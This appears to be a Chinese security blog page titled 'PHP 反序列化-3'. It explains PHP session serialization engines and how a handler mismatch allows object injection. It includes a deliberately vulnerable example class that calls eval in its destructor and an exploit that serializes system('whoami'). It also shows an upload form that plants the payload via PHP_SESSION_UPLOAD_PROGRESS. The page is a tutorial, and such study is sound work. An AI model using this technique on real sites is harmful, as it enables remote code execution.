@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>PHP 反序列化-3</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/php-3/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='PHP 反序列化-3'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/php-3/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="PHP 反序列化-3">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/php-3/">
+                <img src="/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-3" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/php-3/">PHP 反序列化-3</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="php反序列化-3">PHP反序列化-3</h1>
+<h2 id="php中的session">PHP中的Session</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Directive</th>
+<th style="text-align:left">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">session.save_handler</td>
+<td style="text-align:left">session保存形式。默认为files</td>
+</tr>
+<tr>
+<td style="text-align:left">session.save_path</td>
+<td style="text-align:left">session保存路径。</td>
+</tr>
+<tr>
+<td style="text-align:left">session.serialize_handler</td>
+<td style="text-align:left">session序列化存储所用处理器。默认为php</td>
+</tr>
+<tr>
+<td style="text-align:left">session.upload_progress.cleanup</td>
+<td style="text-align:left">一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
+</tr>
+<tr>
+<td style="text-align:left">session.upload_progress.enabled</td>
+<td style="text-align:left">将上传文件的进度信息存在session中。默认开启。</td>
+</tr>
+</tbody>
+</table>
+<p>在上述的配置中，<code>session.serialize_handler</code>是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不同。具体如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">处理器名称</th>
+<th style="text-align:left">存储格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">php</td>
+<td style="text-align:left">键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_binary</td>
+<td style="text-align:left">键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_serialize</td>
+<td style="text-align:left">经过serialize()函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody>
+</table>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;引擎名&#39;</span><span class="p">);</span>
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;haha&#39;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>php引擎：<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 534; 
+			flex-basis: 1283px"
+	>
+	<a href="/p/php-3/image-20220221154530020.png" data-size="139x26">
+		<img src="/p/php-3/image-20220221154530020.png"
+			width="139"
+			height="26"
+			srcset="/p/php-3/image-20220221154530020_hucaf212580a72fcf1818e0ec7ef14c900_1736_480x0_resize_box_3.png 480w, /p/php-3/image-20220221154530020_hucaf212580a72fcf1818e0ec7ef14c900_1736_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>php_binary:<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 714; 
+			flex-basis: 1714px"
+	>
+	<a href="/p/php-3/image-20220221154656400.png" data-size="150x21">
+		<img src="/p/php-3/image-20220221154656400.png"
+			width="150"
+			height="21"
+			srcset="/p/php-3/image-20220221154656400_hu7d25136b513882a7759e344d75d571f4_1996_480x0_resize_box_3.png 480w, /p/php-3/image-20220221154656400_hu7d25136b513882a7759e344d75d571f4_1996_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>php_serialize:<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1100; 
+			flex-basis: 2640px"
+	>
+	<a href="/p/php-3/image-20220221154741266.png" data-size="231x21">
+		<img src="/p/php-3/image-20220221154741266.png"
+			width="231"
+			height="21"
+			srcset="/p/php-3/image-20220221154741266_hu60e07f9d08ffeb172667bc69f16e7dfa_2520_480x0_resize_box_3.png 480w, /p/php-3/image-20220221154741266_hu60e07f9d08ffeb172667bc69f16e7dfa_2520_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="session反序列化漏洞原理">Session反序列化漏洞原理</h2>
+<p>如果在PHP在反序列化存储的$_SESSION数据时<strong>使用的引擎和序列化使用的引擎不一样</strong>，会导致数据无法正确反序列化。通过精心构造数据包，就可以绕过程序的验证或者是执行一些敏感操作。</p>
+<p>例如-在session中放入如下数据：</p>
+<pre tabindex="0"><code>$_SESSION['name'] = '|O:8:&quot;stdClass&quot;:0:{}';
+</code></pre><p>而存储session数据用的处理器为<code>php_serialize</code>，内容如下：</p>
+<pre tabindex="0"><code>a:1:{s:4:&quot;name&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:{}&quot;;}
+</code></pre><p>那么当读取数据时采用的是<code>php</code>引擎的话，反序列化时，根据php引擎对session数据的解释，会将<code>|</code>以前看作键名，而将这之后的<code>O:8:&quot;stdClass&quot;:0:{}</code>看作键值，反序列后就会得到stdClass类对象。</p>
+<p><strong>分两种情况进行利用：</strong></p>
+<ul>
+<li>session.auto_start=On</li>
+</ul>
+<p>当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了<code>session_start()</code>），因为该过程是发生在<strong>脚本代码执行前</strong>，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;session.auto_start&#39;</span><span class="p">))</span> 
+  <span class="nx">session_destroy</span><span class="p">();</span>
+
+<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
+<span class="nx">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]))</span>
+  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
+</code></pre></div><ul>
+<li>session.auto_start=Off</li>
+</ul>
+<p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题。</p>
+<h2 id="示例">示例</h2>
+<p>index.php:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="c1">//A webshell is wait for you
+</span><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="k">class</span> <span class="nc">OowoO</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$mdzz</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+    <span class="nx">highlight_string</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>传入phpinfo，看一看配置：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 334; 
+			flex-basis: 802px"
+	>
+	<a href="/p/php-3/image-20220221165058052.png" data-size="930x278">
+		<img src="/p/php-3/image-20220221165058052.png"
+			width="930"
+			height="278"
+			srcset="/p/php-3/image-20220221165058052_hua006efd23c27f608cb73fbb936663f93_22459_480x0_resize_box_3.png 480w, /p/php-3/image-20220221165058052_hua006efd23c27f608cb73fbb936663f93_22459_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>可看到<strong>Session序列化和反序列化的处理引擎不同</strong>。</p>
+<p>而想要进行利用就得往session中放入数据，可利用<code>session.upload_progress</code>，可观察到<strong>session.upload_progress.cleanup<code>配置为</code>Off</strong>:</p>
+<p>当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 连接在一起的值，所以可通过 session.upload_progress 来设置 session。</p>
+<p><strong>因此，利用如下：</strong></p>
+<ul>
+<li>构造exp</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
+<span class="k">class</span> <span class="nc">OowoO</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$mdzz</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><ul>
+<li>构造上传表单</li>
+</ul>
+<pre tabindex="0"><code>&lt;form action=&quot;index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;       
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;        
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;        
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre><ul>
+<li>拦截上传请求，修改PHP_SESSION_UPLOAD_PROGRESS的值为exp:</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 267; 
+			flex-basis: 642px"
+	>
+	<a href="/p/php-3/image-20220221165021990.png" data-size="854x319">
+		<img src="/p/php-3/image-20220221165021990.png"
+			width="854"
+			height="319"
+			srcset="/p/php-3/image-20220221165021990_hu1742ebe7ce61e2bbc9d369c41ffca6f9_51670_480x0_resize_box_3.png 480w, /p/php-3/image-20220221165021990_hu1742ebe7ce61e2bbc9d369c41ffca6f9_51670_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#php中的session">PHP中的Session</a></li>
+    <li><a href="#session反序列化漏洞原理">Session反序列化漏洞原理</a></li>
+    <li><a href="#示例">示例</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
